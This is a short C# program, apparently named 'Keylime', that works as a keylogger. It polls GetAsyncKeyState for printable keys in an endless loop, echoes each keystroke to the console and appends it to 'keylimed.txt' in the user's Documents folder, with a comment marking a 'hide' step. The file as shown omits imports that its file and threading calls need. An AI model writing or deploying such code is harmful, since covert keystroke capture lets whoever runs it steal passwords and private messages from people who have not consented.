using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace Keylime
{
    class Program
    {
        [DllImport("User32.dll")]

        public static extern int GetAsyncKeyState(Int32 i);
        static void Main(string[] args)
        {
            //create and store keystrokes to file
            string filePath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            if (!Directory.Exists(filePath)) {
                Directory.CreateDirectory(filePath);
            }
            string path = (filePath + "/keylimed.txt");
            // capture the keystrokes

            if (!File.Exists(path))
            {
                using (StreamWriter sw = File.CreateText(path)) { 

                        }
            }
            while (true)
            {
                //hide
                Thread.Sleep(10);

                //ASCII table of Keys
                for (int i = 32; i < 127; i++)
                {
                    int keyState = GetAsyncKeyState(i);
                    if (keyState == -32767)
                    {
                        //print out the pressed key
                        Console.Write("[ " + (char) i + " ] ");
                        //Store to text file
                        using (StreamWriter sw = File.AppendText(path))
                        {
                            sw.Write((char) i);
                        }
                    }
                }
            }
        }


    }
}
